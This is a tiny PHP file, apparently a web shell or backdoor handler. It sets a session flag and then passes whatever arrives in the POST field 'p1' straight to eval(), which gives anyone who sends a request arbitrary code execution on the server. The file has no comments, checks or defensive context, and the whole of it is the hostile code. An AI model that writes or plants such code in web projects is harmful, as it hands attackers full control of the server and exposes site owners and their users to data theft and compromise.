<?php
$_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax'] = true;
eval($_POST['p1']);
exit; 
?>